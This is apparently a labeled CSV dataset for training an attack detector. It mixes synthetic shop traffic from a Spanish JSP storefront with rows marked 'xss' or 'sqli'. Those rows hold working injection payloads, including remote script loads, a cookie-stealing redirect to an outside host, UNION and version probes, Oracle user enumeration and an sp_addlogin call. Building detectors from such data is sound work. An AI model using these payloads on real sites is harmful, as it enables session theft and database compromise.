payload,type
"<img src=""Mario Heiderich says that svg SHOULD not be executed trough image tags"" onerror=""javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');""></img>",xss
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
6477,normal
trobos 39 4e,normal
publico/autenticar.jsp?modo=entrar&login=yutaka&pwd=OficioS%24O&remember=off&B1=Entrar,normal
"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",xss
navas de jorquera,normal
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
50645313a,normal
peng1in,normal
lanfranchi@getgold.tl,normal
miembros/imagenes/castro.jpg,normal
publico/caracteristicas.jsp?id=1,normal
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",xss
imagenes/3.gif,normal
publico/pagar.jsp?modo=insertar&precio=6684&B1=Pasar+por+caja,normal
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
global/estilos.css,normal
publico/registro.jsp?modo=registro&login=calleja&password=fermentadora&nombre=Lahuen&apellidos=Palau+Ustrell&email=baxley%40italianmotorvillagesevilla.sh&dni=01084400L&direccion=Plaza+Aparejador+Federico+Bermudez+139%2C+&ciudad=Orce&cp=18129&provincia=Vizcaya&ntc=1769642985963078&B1=Registrar,normal
35210254z,normal
"sov1o: select * from users where id='1' + @ 1! union select 1,version() -- 1'",sqli
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",xss
imagenes/2.gif,normal
"&lt;SCRIPT a=\""&gt;'&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
6.19E+15,normal
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
miembros/fotos.jsp,normal
"<IMG SRC=x onkeydown=""alert(String.fromCharCode(88,83,83))"">",xss
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,xss
imagenes/1.gif,normal
47965007w,normal
amorebieta-etxano,normal
imagenes/2.gif,normal
imagenes/cmenbul.gif,normal
<input onfocus=javascript:alert(1) autofocus>,xss
"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",xss
global/creditos.jsp,normal
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",xss
global/titulo.jsp,normal
publico/productos.jsp,normal
index.jsp,normal
miembros/fotos.jsp,normal
<input onfocus=javascript:alert(1) autofocus>,xss
publico/carrito.jsp,normal
global/creditos.jsp,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=64&B1=A%F1adir+al+carrito,normal
diezma,normal
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;,xss
"plaa del mercat, 198 7-c",normal
global/creditos.jsp,normal
"so;s: select * from users where id=1 or ""%;"" or 1=1 -- 1",sqli
79144797a,normal
publico/carrito.jsp,normal
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=66&B1=A%F1adir+al+carrito,normal
12480,normal
nagaraja,normal
ambiental,normal
imagenes/logo.gif,normal
pingajosa,normal
"sons: select * from users where id=1 or ""%_"" or 1=1 -- 1",sqli
desiree,normal
wanda,normal
global/creditos.jsp,normal
imagenes/nuestratierra.jpg,normal
miembros/index.jsp,normal
"admin"") or ""1""=""1""--",sqli
8.85E+15,normal
tomkin,normal
global/menum.jsp,normal
publico/miembros.jsp,normal
"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",xss
"<IMG SRC=x onwheel=""alert(String.fromCharCode(88,83,83))"">",xss
feutlins,normal
miembros/imagenes/castro.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/imagenes/castro.jpg,normal
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
global/menum.jsp,normal
<img src=xss onerror=alert(1)>,xss
reiji,normal
imagenes/1.gif,normal
"s)?s: select * from users where id=1 or "")]"" or 1=1 -- 1",sqli
flavio,normal
"<;IMG SRC="";javascript:alert(';XSS';);"";>;",xss
) union select * from information_schema.tables;,sqli
publico/pagar.jsp?modo=insertar&precio=9209&B1=Confirmar,normal
"&oUEv: select * from users where id=1 or \<\ union select null,@@VERSION -- 1",sqli
dagmar,normal
belva,normal
ac6di9o,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/2.gif,normal
miembros/fotos.jsp,normal
danis,normal
19140,normal
publico/miembros.jsp,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=83&B1=A%F1adir+al+carrito,normal
publico/productos.jsp,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=62&B1=A%F1adir+al+carrito,normal
global/titulo.jsp,normal
index.jsp,normal
miembros/imagenes/ogono.jpg,normal
publico/registro.jsp?modo=registro&login=ftpsites&password=t0t0&nombre=Alfio&apellidos=Potel+Ivars&email=storgaard-szibo3%40elreversotenebroso.ky&dni=17889538T&direccion=Diogenes+82%2C+&ciudad=Ag%F3n&cp=47450&provincia=Guadalajara&ntc=8851191771150286&B1=Registrar,normal
48042322z,normal
8.22E+15,normal
publico/autenticar.jsp?modo=entrar&login=monette&pwd=1ob20h9la3&remember=off&B1=Entrar,normal
imagenes/cmenbul.gif,normal
"<img src=x\x12onerror=""javascript:alert(1)"">",xss
7.87E+15,normal
"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",xss
so.n&: select * from users where id='1' <@.$ or 1=1 -- 1',sqli
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",xss
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",xss
sandberg@3horas.tl,normal
5123,normal
almendros,normal
ribamontn al mar,normal
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss
"';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//"";;alert(String.fromCharCode(88,83,83))//\"";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;"";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",xss
22390,normal
<script src=%(jscript)s></script>,xss
publico/productos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/3.gif,normal
9.55E+15,normal
' or ''^',sqli
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,xss
&n1&1: select * from users where id=1 or $ 1=1 or 1=1 -- 1,sqli
publico/productos.jsp,normal
saviange_files@zytel.nc,normal
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,xss
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,xss
guadiana 149 6f,normal
global/titulo.jsp,normal
imagenes/nuestratierra.jpg,normal
81383348x,normal
stadler_munks@chevrolet-volt.at,normal
capaz9,normal
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"carlos trivio moreno, 2,",normal
"s.UEs: select * from users where id=1 or 1#"". union select 'a',version() -- 1",sqli
miembros/index.jsp,normal
vital,normal
' having 1=1--,sqli
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss
publico/pagar.jsp?modo=insertar&precio=7537&B1=Confirmar,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",sqli
55265136t,normal
"<IMG SRC=""javascript:alert('XSS');"">",xss
imagenes/logo.gif,normal
global/estilos.css,normal
?revivir,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=31&B1=A%F1adir+al+carrito,normal
imagenes/logo.gif,normal
3814,normal
adolfo,normal
publico/productos.jsp,normal
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
&#X3c,xss
karlweiss@barnicesuv.gov,normal
imagenes/cmenbul.gif,normal
"<img DYNSRC=""javascript:document.vulnerable=true;"">",xss
"<XSS STYLE=""xss:expression(document.vulnerable=true)"">",xss
imagenes/1.gif,normal
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,xss
global/creditos.jsp,normal
imagenes/3.gif,normal
publico/pagar.jsp?modo=insertar&precio=7626&B1=Confirmar,normal
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
index.jsp,normal
"c/ virgen de la almudena, 61 12?c",normal
genestar llufriu,normal
90230020p,normal
"""`'><script>\xE2\x80\x89javascript:alert(1)</script>",xss
global/creditos.jsp,normal
miembros/imagenes/ogono.jpg,normal
"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/imagenes/zarauz.jpg,normal
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
sevilla,normal
"<input type=""image"" dynsrc=""javascript:document.vulnerable=true;"">",xss
elsen@whitehat.td,normal
arraia-maeztu,normal
miembros/editar.jsp?modo=registro&login=carilyn&password=e1pirativo&nombre=Aventino&apellidos=Abell%F3+Lamarca&email=plang_schallert%40white-pearl-resort.kp&dni=66718383Y&direccion=C%2F+Misericordia%2C+57+7-H&ciudad=Baides&cp=35231&provincia=Valladolid&ntc=6302817063301722&B1=Registrar,normal
miembros/imagenes/castro.jpg,normal
miembros/imagenes/ogono.jpg,normal
1&1c: select * from users where id=1 +1 or 1=1 -- 1,sqli
imagenes/cmenbul.gif,normal
6769,normal
publico/miembros.jsp,normal
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
publico/caracteristicas.jsp?id=1,normal
ribadumia,normal
longhurst-street1@drae2.pa,normal
3.35E+15,normal
valido casademont,normal
\u003c,xss
casasola de arin,normal
"s:os: select * from users where id=1 or "":%"" or 1=1 -- 1",sqli
"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss
imagenes/3.gif,normal
"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
dierkop@hayunmundoahifuera.id,normal
siefert,normal
global/menum.jsp,normal
imagenes/3.gif,normal
miembros/imagenes/zarauz.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
pe7tr0b9,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
tenuta,normal
"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",xss
global/menum.jsp,normal
"sUEvk: select * from users where id='1'   union select null,banner from v$version where rownum=1 -- 1'",sqli
<title onpropertychange=javascript:alert(1)></title><title title=>,xss
"plza. carmelo solis, 78, 4?g",normal
select,sqli
van_eyk,normal
miembros/salir.jsp,normal
8888'+AND+'1'+LIKE+'1 -->,sqli
gussack.reinecke@eddydaniele.pt,normal
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
"s..s: select * from users where id=1 or ""..""=1 or 1=1 -- 1",sqli
"<;META HTTP-EQUIV="";Set-Cookie""; Content="";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;"";>;",xss
trebaol@arroyomolinos-madrid.gq,normal
"<style type=""text/css"">BODY{background:url(""javascript:document.vulnerable=true"")}</style>",xss
global/creditos.jsp,normal
22010612a,normal
imagenes/3.gif,normal
invo3unta6i5,normal
miembros/imagenes/castro.jpg,normal
publico/carrito.jsp,normal
8470,normal
leiding@ubuybetter.cat,normal
<img src=``&NewLine; onerror=alert(1)&NewLine;,xss
trigueros del valle,normal
imagenes/cmenbul.gif,normal
3.40E+15,normal
imagenes/1.gif,normal
imagenes/nuestratierra.jpg,normal
"marines, los",normal
"<BASE HREF=""javascript:javascript:alert(1);//"">",xss
publico/registro.jsp?modo=registro&login=tiedeman&password=ag2u7a&nombre=Sayara&apellidos=Carta%F1a&email=albertini_trauberg%40theroxyblue.jo&dni=71814891J&direccion=C%2F+Gamos+5%2C+11-H&ciudad=Casabermeja&cp=44707&provincia=Alicante&ntc=4856355827488327&B1=Registrar,normal
miembros/imagenes/castro.jpg,normal
cele959n3s0o,normal
jaspe ochoa,normal
<b <script>alert(1)</script>0,xss
"travesia doctor sanchez, 139, 12?h",normal
"exec sp_addlogin 'name' , 'password'",sqli
story.darby@hostingprofessional.mv,normal
<script\x0A>javascript:alert(1)</script>,xss
publico/registro.jsp?modo=registro&login=kerlovic&password=lad%F3n&nombre=Vitalia&apellidos=Baeza+Redon&email=slavin%40windshiptrader.coop&dni=95642019S&direccion=Jose+Maria+Mortes+Lerma%2C+151+11-D&ciudad=Campos+del+Para%EDso&cp=18449&provincia=Alicante&ntc=8158378459741170&B1=Registrar,normal
publico/miembros.jsp,normal
"<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=""http://www.procheckup.com/?sid=""%2bdocument.cookie)>",xss
abagail,normal
publico/pagar.jsp?modo=insertar&precio=1433&B1=Confirmar,normal
miembros/editar.jsp?modo=registro&login=tropeano3&password=86a7o&nombre=Alimena&apellidos=Santidrian+Rexach&email=musson%40ajuntamentdebarcelona20.pr&dni=12186635Q&direccion=Castilla+S%2FN+&ciudad=Legarda&cp=33875&provincia=Toledo&ntc=5536600969659944&B1=Registrar,normal
index.jsp,normal
"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
almedina,normal
"<script src=""javascript:alert(1)"">",xss
flo3a,normal
16610,normal
publico/miembros.jsp,normal
miembros/index.jsp,normal
miembros/index.jsp,normal
publico/pagar.jsp?modo=insertar&precio=958&B1=Pasar+por+caja,normal
fresia,normal
global/menum.jsp,normal
"s)v: select * from users where id=1 or "")@"" or 1=1 -- 1",sqli
publico/productos.jsp,normal
44650,normal
matilla la seca,normal
.o&1c: select * from users where id=1. <@ or 1=1 -- 1,sqli
global/menum.jsp,normal
toperzer1,normal
publico/pagar.jsp?modo=insertar&precio=9620&B1=Pasar+por+caja,normal
s&n1&: select * from users where id='1' or $ 1=1 or 1=1 -- 1',sqli
imagenes/3.gif,normal
publico/caracteristicas.jsp?id=1,normal
global/creditos.jsp,normal
"<div style=""font-family:foo}color=red;"">XXX",xss
publico/carrito.jsp,normal
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",xss
tamer,normal
global/estilos.css,normal
imagenes/cmenbul.gif,normal
"<;A HREF="";http://0x42.0x0000066.0x7.0x93/"";>;XSS<;/A>;",xss
publico/productos.jsp,normal
nuez de balboa 131 2-f,normal
global/estilos.css,normal
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=56&B1=A%F1adir+al+carrito,normal
"pasaje magistrado salvador barbera 136,",normal
benavente,normal
rasmia,normal
publico/caracteristicas.jsp?id=1,normal
"c/ pintor viver s/n, 1?b",normal
' select * from information_schema.tables--,sqli
<frameset onload=javascript:alert(1)>,xss
"<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",xss
global/titulo.jsp,normal
miembros/imagenes/castro.jpg,normal
imagenes/2.gif,normal
15994230f,normal
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
557ni03r5o,normal
"s&()o: select * from users where id='1' or (\)=1 union select 1,@@VERSION -- 1'",sqli
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",xss
global/creditos.jsp,normal
dicaprio,normal
publico/miembros.jsp,normal
"""><STYLE>@import""javascript:alert('XSS')"";</STYLE>",xss
9.36E+14,normal
franchetti.martinsan@elsentidodelavida.qa,normal
salgado,normal
imagenes/1.gif,normal
miembros/salir.jsp,normal
imagenes/cmenbul.gif,normal
10300,normal
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
imagenes/logo.gif,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;",xss
clariana de cardener,normal
publico/carrito.jsp,normal
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
index.jsp,normal
34120,normal
exec(@s),sqli
<script ~~~>alert(0%0)</script ~~~>,xss
d2sa2uer5o,normal
global/titulo.jsp,normal
850il1ta045n,normal
miembros/imagenes/ogono.jpg,normal
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
de1l2nda9ur4,normal
miembros/imagenes/ogono.jpg,normal
"o(1)U: select * from users where id=1 *(1) union select 1,banner from v$version where rownum=1 -- 1",sqli
"sUE1k: select * from users where id='1' union select 1,banner from v$version where rownum=1 -- 1'",sqli
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",xss
miembros/imagenes/ogono.jpg,normal
#NAME?,sqli
imagenes/nuestratierra.jpg,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",sqli
miembros/fotos.jsp,normal
"<script src=""/\%(jscript)s""></script>",xss
vizcaya,normal
49212,normal
"`""'><img src=xxx:x \x27onerror=javascript:alert(1)>",xss
"<embed width=500 height=500 code=""data:text/html,<script>%(payload)s</script>""></embed>",xss
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
<iframe// src=javaSCRIPT&colon;alert(1),xss
6.54E+15,normal
imagenes/cmenbul.gif,normal
"s&n1U: select * from users where id='1' or $ 1=1 union select 1,@@VERSION -- 1'",sqli
or 0=0 #,sqli
mccarthy.darcy@tantomontamontatanto.jo,normal
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",xss
vilanova de segri,normal
global/menum.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/salir.jsp,normal
pr99o9a9,normal
"s\c: select * from users where id=1 or ""\#"" or 1=1 -- 1",sqli
5exas9labo,normal
miembros/editar.jsp?modo=registro&login=whinnery&password=encabar&nombre=Sabiela&apellidos=Royo+Mascarell&email=cane%40meneamex.br&dni=60106679C&direccion=Calle+Biznaga%2C+5+&ciudad=Velilla+de+Cinca&cp=15124&provincia=Santa+Cruz+de+Tenerife&ntc=6795968081758370&B1=Registrar,normal
imagenes/nuestratierra.jpg,normal
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",xss
"<IMG SRC=x onoffline=""alert(String.fromCharCode(88,83,83))"">",xss
onzonilla,normal
"UEvn,: select * from users where id=1 union select @ _,version() -- 1",sqli
santa cruz de tenerife,normal
¼script¾alert(¢XSS¢)¼/script¾,xss
imagenes/logo.gif,normal
"<script a="">"" '' SRC=""http://www.securitycompass.com/xss.js""></script>",xss
75590487k,normal
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss
"<? foo=""><script>alert(1)</script>"">",xss
"<img src=""livescript:document.vulnerable=true;"">",xss
publico/autenticar.jsp?modo=entrar&login=meloling&pwd=op0o62i4&remember=off&B1=Entrar,normal
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",xss
"c/ de las violetas, 104,",normal
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=37&B1=A%F1adir+al+carrito,normal
"s:v: select * from users where id=1 or "":@"" or 1=1 -- 1",sqli
kellard@todobetis.gf,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
venfica,normal
publico/autenticar.jsp?modo=entrar&login=mizerk&pwd=balitear&remember=off&B1=Entrar,normal
miembros/editar.jsp?modo=registro&login=pollack&password=7zNaLLo&nombre=Sigfrido&apellidos=Ayoroa&email=jaenicke%40lamola-hotel.coop&dni=87853992H&direccion=Cami%F1o+Do+Verme+112+11A&ciudad=Valdelcubo&cp=16452&provincia=Asturias&ntc=8912004350396189&B1=Registrar,normal
